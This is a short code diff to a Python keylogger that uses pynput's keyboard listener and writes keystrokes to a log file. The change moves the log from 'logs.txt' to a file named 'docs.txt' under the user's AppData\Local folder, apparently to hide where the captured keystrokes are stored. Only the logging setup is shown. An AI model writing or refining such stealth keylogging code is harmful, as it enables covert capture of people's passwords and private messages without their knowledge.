@@ -1,8 +1,9 @@
+import os
 from pynput.keyboard import Listener
 import logging
 
 logging.basicConfig(
-    filename=("logs.txt"),
+    filename=(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\docs.txt"),
     level = logging.DEBUG, format="%(asctime)s: %(message)s"
 )
 
